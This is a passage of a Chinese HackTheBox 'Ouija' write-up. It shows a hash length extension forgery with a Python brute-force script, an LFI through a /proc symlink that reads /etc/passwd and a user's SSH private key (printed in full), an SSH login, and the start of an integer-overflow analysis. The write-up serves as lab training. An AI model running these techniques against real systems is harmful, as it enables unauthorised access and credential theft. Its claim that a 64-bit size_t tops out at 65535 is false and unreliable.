           if(file.startsWith("/") || file.includes('..') || file.includes("../")){
               r.json({"message":"Action not allowed"});
           }else{
               fs.readFile(file, 'utf8', (e,d)=>{
                   if(e) {
                       r.json({"message":e});
                   }else{
                       r.json({"message":d});
                   }
               });
           }
       }
   });
   ```

   可以看到identification在变成hash之前经历了base64解码，因此我们需要将这边的New string也进行base64编码，编码后它对应的是identification标头的内容，New signature对应的是ihash标头的内容。

   

4. 将hash_extender的结果保存到一个文件中，然后利用一个简单的脚本来测试哪个secret可用。

   ```
   ┌──(root㉿kali)-[/tmp]
   └─# /root/TOOLS/hash_extender/hash_extender --data 'bot1:bot' --signature 4b22a0418847a51650623a458acc1bba5c01f6521ea6135872b9f15b56b988c1 --append '::admin:True' --format sha256 --secret-min=1 --secret-max=24 > test1
   
   ```

   利用/users来测试正确的ihash和identification。当身份验证通过的时候/users会返回``Database unavailable`,枚举脚本如下

   ```python
   import sys
   import requests
   import binascii
   import base64
   import re
   
   # Specify the path to your file
   file_path = 'test1'  # Update with the actual file path
   
   # Read the content of the file
   with open(file_path, 'r') as file:
       content = file.read()
   
   #print("Content:", content)
   
   # Define regular expressions to match "New signature" and "New string" lines
   signature_pattern = re.compile(r'New signature:\s*(\w+)\n')
   string_pattern = re.compile(r'New string:\s*(\w+)\n')
   
   # Use the regular expressions to find matches in the content
   signature_matches = signature_pattern.finditer(content)
   string_matches = string_pattern.finditer(content)
   
   # Extract the values
   signatures_array = [match.group(1) for match in signature_matches]
   strings_array = [match.group(1) for match in string_matches]
   #print("ihash_array type:",type(signatures_array)
   
   n=len(signatures_array)
   
   for i in range(0,n):
       ihash=signatures_array[i]
       identification=base64.b64encode(strings_array[i].encode("utf-8")).decode('utf-8')
       
       #print(i+1)
       #print("ihash:",ihash)
       #print("identification:",identification)
       #print('\n')
       
       session = requests.session()
       burp0_url = "http://ouija.htb:3000/users"
       burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0", "ihash": ihash, "identification": identification, "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2", "Accept-Encoding": "gzip, deflate, br", "Connection": "close", "Upgrade-Insecure-Requests": "1", "If-None-Match": "W/\"19-MSxtr7/B/C28D2L7ZPuhkY77ktU\""}
       
       try:
           req=session.get(burp0_url, headers=burp0_headers).text
           if(req.find("Database unavailable") != -1):
               print("ihash:",ihash)
               print("identification:",identification)
               break
           
       except:
           pass
   ```

5. 运行该脚本得到有效的ihash和identification

   ```
   ┌──(root㉿kali)-[/tmp]
   └─# python exploit.py
   ihash: 14be2f4a24f876a07a5570cc2567e18671b15e0e005ed92f10089533c1830c0b
   identification: NjI2Zjc0MzEzYTYyNmY3NDgwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDBmODNhM2E2MTY0NmQ2OTZlM2E1NDcyNzU2NQ==
   ```

   在burpsuite中验证一下![image-20231206223112382](https://raw.githubusercontent.com/yxl2001/Note-drawing-bed/main/images/202312072319372.png)



## 2.2 ouija.htb:3000/file/get?file= 的LFI

1. 现在有了正确的ihash和identification，来访问ouija.htb:3000/file/get测试file参数

   首先回顾一下app.js中的/file/get部分的操作,它过滤了 `../`来防止目录遍历

   ```js
   app.get("/file/get",(q,r,n) => {
       ensure_auth(q, r);
       if(!q.query.file){
           r.json({"message":"?file= i required"});
       }else{
           let file = q.query.file;
           //防止目录遍历
           if(file.startsWith("/") || file.includes('..') || file.includes("../")){
               r.json({"message":"Action not allowed"});
           }else{
               fs.readFile(file, 'utf8', (e,d)=>{
                   if(e) {
                       r.json({"message":e});
                   }else{
                       r.json({"message":d});
                   }
               });
           }
       }
   ```

   

   留意**ini.sh**中的下列语句，在当前目录下创建了一个`.config/bin/process_informations`来链接`/proc`

   ```
   ln -s /proc .config/bin/process_informations
   ```

   我们可以通过.config/bin/process_informations来访问/porc，/proc是Linux中的虚拟文件系统，提供有关进程和系统信息的信息

   我们可以通过访问`/proc/self/root/`来访问根目录的进程所看到的根目录。


2. 通过`GET /file/get?file=.config/bin/process_informations/self/root/etc/passwd`验证了此处存在LFI

   ![image-20231207164121542](https://raw.githubusercontent.com/yxl2001/Note-drawing-bed/main/images/202312072320887.png)

3. 注意到在ouija.htb:3000/file/get中的LFI得到的/etc/passwd跟dev.ouija.htb中的LFI不一样，大概是因为存在于两个不同的容器中。

   这里发现了除了root外还有一个leila可以用于登录。

   利用LFI获取该用户的ssh私钥(id_rsa)。

   ```
   GET /file/get?file=.config/bin/process_informations/self/root/home/leila/.ssh/id_rsa
   ```

   ![image-20231207164633074](https://raw.githubusercontent.com/yxl2001/Note-drawing-bed/main/images/202312072320662.png)

   leila的ssh私钥

   ```
   -----BEGIN OPENSSH PRIVATE KEY-----
   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
   DvfM2TbsfLo4kAAAALbGVpbGFAb3VpamE=
   -----END OPENSSH PRIVATE KEY-----
   ```

   

4. 利用该私钥连接上目标机器

   ```
   ┌──(root㉿kali)-[/tmp]
   └─# ssh -i id_rsa leila@10.10.11.244            
   
   
   leila@ouija:~$ id
   uid=1000(leila) gid=1000(leila) groups=1000(leila)
   ```

   

# 03、本地特权升级

## 3.1 简单枚举

1. 使用linpeas.sh检索目标信息

   枚举了一圈，感觉也就这些本地额外端口值得尝试

   ![image-20231207170658169](https://raw.githubusercontent.com/yxl2001/Note-drawing-bed/main/images/202312072320310.png)

   利用ssh的本地端口转发来访问其他端口,经过测试9999口运行的服务值得探索

   ![image-20231207172025537](https://raw.githubusercontent.com/yxl2001/Note-drawing-bed/main/images/202312072320728.png)

   ```
   ssh -i id_rsa -L 9999:localhost:9999 leila@10.10.11.244
   
   ┌──(root㉿kali)-[~]
   └─# nmap -sV -sC -Pn -p9999 127.0.0.1 --min-rate 10000
   
   Nmap scan report for localhost (127.0.0.1)
   Host is up (0.00015s latency).
   
   PORT     STATE SERVICE VERSION
   9999/tcp open  http    PHP cli server 5.5 or later (PHP 8.2.12)
   |_http-title: Site doesn't have a title (text/html; charset=UTF-8).
   ```



## 3.2 9999口服务枚举

1. 在目标机器上寻找9999口的web服务的文件夹

   测试过程中发现9999口的web服务下有index.php文件，于是我递归寻找包含该文件的所有目录

   ```
   leila@ouija:/$ find / -type f -name "index.php" 2>/dev/null
   /development/server-management_system_id_0/core/index.php
   /development/server-management_system_id_0/index.php
   ```

   从结果来看`/development/server-management_system_id_0`应该就是9999口上服务的目录了，index.php的完整代码

   ```php+HTML
   <?php
   //定义了一个名为 info__index__wellcom 的类，包含一些静态和实例属性，如版本号 ($__VERSION)、调试模式 ($__DEBUG)、描述 ($__DESCRIPTION) 等。包含一个私有的静态属性 __DBCREDS 和 __PPD，可能用于存储数据库凭据和某些平台相关的数据。
           class info__index__wellcom{
                   public static $__VERSION = 0;
                   public static $__DEBUG = 1;
                   public $__DESCRIPTION = "testing login";
                   public static $__IS_ATTACHED_TO_SYS = 1;
                   public static $__NAME = "WBMS root";
                   public $__OWNER = "WBMS ouija";
                   public $__PRODUCT_ID = 0;
                   private static $__DBCREDS = "0:0@/0";
                   private static $__PPD = "linux/php";
           }
   ?>
   
   <?php
   //如果调试模式 ($__DEBUG) 开启，通过 include 语句加载了一个 debug.php 文件，然后调用 init_debug() 函数初始化调试。
   //debug.php的路径 /development/utils/debug.php
           if(info__index__wellcom::$__DEBUG){
                   include '../utils/debug.php';
                   init_debug();
           }
   ?>
   <?php
   //通过检查 $_POST 中是否设置了用户名和密码，进行用户登录验证。
           if(isset($_POST['username']) && isset($_POST['password'])){
   //              system("echo ".$_POST['username']." > /tmp/LOG");
               
               //调用了 say_lverifier 函数，但该函数的实现没有提供，所以无法了解具体的登录验证逻辑。
                   if(say_lverifier($_POST['username'], $_POST['password'])){
          //如果登录验证成功，创建了一个会话 (session_start())，设置了一些会话变量，然后将用户重定向到/core/index.php。
                           session_start();
                           $_SESSION['username'] = $_POST['username'];
                           $_SESSION['IS_USER_'] = "yes";
                           $_SESSION['__HASH__'] = md5($_POST['username'] . "::" . $_POST['password']);
                           header('Location: /core/index.php');
                   }else{
                           echo "<script>alert('invalid credentials')</alert>";
                   }
           }
   ?>
   <link href='https://fonts.googleapis.com/css?family=Open+Sans:700,600' rel='stylesheet' type='text/css'>
   <style>
   body{
     background-image: url("img/bg.png");
     font-family: 'Open Sans', sans-serif;
     margin: 0 auto 0 auto;
     width:100%;
     text-align:center;
     margin: 20px 0px 20px 0px;
   }
   
   p{
     font-size:12px;
     text-decoration: none;
     color:black;
   }
   
   h1{
     font-size:1.5em;
     color:black;
   }
   h2{
     font-size:1.3em;
     color:black;
   }
   
   .box{
     background:white;
     width:300px;
     border-radius:6px;
     margin: 0 auto 0 auto;
     padding:0px 0px 70px 0px;
     border: white;
   }
   
   .email{
     background:#ecf0f1;
     border: #ccc 1px solid;
     border-bottom: #ccc 2px solid;
     padding: 8px;
     width:250px;
     color: black;
     margin-top:10px;
     font-size:1em;
     border-radius:4px;
   }
   
   .password{
     border-radius:4px;
     background:#ecf0f1;
     border: #ccc 1px solid;
     padding: 8px;
     width:250px;
     font-size:1em;
   }
   
   .btn{
     background:white;
     width:125px;
     padding-top:5px;
     padding-bottom:5px;
     color:black;
     border-radius:4px;
     border: black 1px solid;
   
     margin-top:20px;
     margin-bottom:20px;
     float:left;
     margin-left:80px;
     font-weight:800;
     font-size:0.8em;
   }
   
   .btn:hover{
     background:white;
   }
   
   #btn2{
     float:left;
     background:white;
     width:125px;  padding-top:5px;
     padding-bottom:5px;
     color:white;
     border-radius:4px;
     border: black 1px solid;
   
     margin-top:20px;
     margin-bottom:20px;
     margin-left:10px;
     font-weight:800;
     font-size:0.8em;
   }
   
   #btn2:hover{
   background:#;
   }</style>
   
   <form method="post" action="index.php">
   <div class="box">
   <h1>Welcom User</h1>
   <h2>WBMS inc</h2>
   <input type="username" name="username" value="" class="email" />
   <input type="password" name="password" value="" class="email" />
   <input type="submit" <div class="btn"></div> version 0.1
   </div> <!-- End Box -->
   </form>
   
   <p>Forgot your password? <br> contact your admin <br> OR request password reset from technical team<br> OR access your device physically and reset your password</p>
   <script src="./main.js" type="text/javascript"></script>
   <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.0/jquery.min.js" type="text/javascript"></script>
   
   ```

   这边实现一个登录表单功能，跟在浏览器中看到的9999口上的服务一致。里面调用了say_lverifier函数，但是这里并没有给出。

2. 递归寻找say_lverifier函数，没有找到

   ```
   leila@ouija:/tmp$ grep -ri "say_lverifier" / 2>/dev/null
   ```

   我对Linux上的php的目录不是很熟悉，google后得知在 Linux 系统上，PHP 函数的定义通常存储在 PHP 扩展模块中。PHP 扩展模块是以共享库（shared library）的形式存在的，它们包含了 PHP 函数的实际实现。这些模块通常位于系统的 PHP 扩展目录`/usr/lib/php/<version>/modules/`中 。

   最终在`/usr/lib/php/20220829/lverifier.so`发现它可能包含say_lverifier函数

   ```
   └─# strings lverifier.so| grep 'say_lverifier'                        
   zif_say_lverifier
   say_lverifier
   zif_say_lverifier
   arginfo_say_lverifier
   arginfo_say_lverifier
   zif_say_lverifier
   ```

   ![image-20231207195649069](https://raw.githubusercontent.com/yxl2001/Note-drawing-bed/main/images/202312072320782.png)



3. 继续检索lverifier.so文件，会找到一处有关处理用户名操作的部分

   ```
   __int64 __fastcall validating_userinput(const char *a1, __int64 a2)
   {
     const char *v2; // r12
     size_t v4; // rdx
     void *v5; // rsp
     unsigned int v7; // edx
     __int64 *v8; // rdi
     __int64 v9; // rcx
     __int64 v10; // rcx
     const char *v11; // rsi
     __m128i src; // [rsp+0h] [rbp-670h] BYREF
     __int64 v13; // [rsp+10h] [rbp-660h]
     __int64 v14; // [rsp+18h] [rbp-658h]
     __int128 v15; // [rsp+20h] [rbp-650h]
     __int128 v16; // [rsp+30h] [rbp-640h]
     __int128 v17; // [rsp+40h] [rbp-630h]
     __int128 v18; // [rsp+50h] [rbp-620h]
     int v19; // [rsp+60h] [rbp-610h]
     __int128 ptr[3]; // [rsp+70h] [rbp-600h] BYREF
     _QWORD v21[81]; // [rsp+A0h] [rbp-5D0h] BYREF
     int v22; // [rsp+328h] [rbp-348h]
     __int64 v23[104]; // [rsp+330h] [rbp-340h] BYREF
   
     v2 = a1;
     v4 = strlen(a1);
     v14 = 0LL;
     src = _mm_load_si128((const __m128i *)&xmmword_2110);
     v15 = 0LL;
     v16 = 0LL;
     v5 = alloca((__int16)(v4 + 10));
     v17 = 0LL;
     memset(v21, 0, sizeof(v21));
     v18 = 0LL;
     v13 = 'gol.re';
     ptr[0] = (__int128)_mm_load_si128((const __m128i *)&xmmword_2120);
     v19 = 0;
     ptr[1] = (__int128)_mm_load_si128((const __m128i *)&xmmword_2130);
     v22 = 0;
     ptr[2] = (__int128)_mm_load_si128((const __m128i *)&xmmword_2140);
     if ( v4 <= 800 )
     {
       v7 = v4 + 1;
       v8 = v23;
       if ( v7 >= 8 )
       {
         v10 = v7 >> 3;
         qmemcpy(v23, v2, 8 * v10);
         v11 = &v2[8 * v10];
         v8 = &v23[v10];
         v9 = 0LL;
         v2 = v11;
         if ( (v7 & 4) == 0 )
         {
   LABEL_6:
           if ( (v7 & 2) == 0 )
             goto LABEL_7;
           goto LABEL_9;
         }
       }
       else
       {
         v9 = 0LL;
         if ( (v7 & 4) == 0 )
           goto LABEL_6;
       }
       *(_DWORD *)v8 = *(_DWORD *)v2;
       v9 = 4LL;
       if ( (v7 & 2) == 0 )
       {
   LABEL_7:
         if ( (v7 & 1) == 0 )
           goto LABEL_3;
   LABEL_8:
         *((_BYTE *)v8 + v9) = v2[v9];
         goto LABEL_3;
       }
   LABEL_9:
       *(_WORD *)((char *)v8 + v9) = *(_WORD *)&v2[v9];
       v9 += 2LL;
       if ( (v7 & 1) == 0 )
         goto LABEL_3;
       goto LABEL_8;
     }
     qmemcpy(v23, a1, 800uLL);
   LABEL_3:
     src.m128i_i64[0] = v23[0];
     v21[79] = v23[99];
     qmemcpy(
       &src.m128i_u64[1],
       (char *)v23 - ((char *)&src - (char *)&src.m128i_u64[1]),
       8LL * (((unsigned int)&src - (unsigned int)&src.m128i_u32[2] + 800) >> 3));
     printf(&format, ptr, &src);
     event_recorder(&src, ptr);
     return load_users(&src, a2);
   }
   ```

   这里的v4是size_t类型，及无符号整型，[64位的无符号整数类型所表示的范围](https://stackoverflow.com/questions/46508831/is-the-max-value-of-size-t-size-max-defined-relative-to-the-other-integer-type)是0~65535,远远大于这边的用来存储username的v23中限制的800，存在整数溢出。

   

   后续部分遇到了问题，首先整数溢出部分之前在PWN中遇到的大部分情况是配合着buffer overflow利用，这里剩下部分的静态代码看的有点迷糊，不知道有没有绕过800这个限制，想用动态调试来解决，然后在so调试部署本地环境的时候遇到了些问题，[后续参考暗羽师傅的wp](https://darkwing.moe/2023/12/05/Ouija-HackTheBox/)。

   
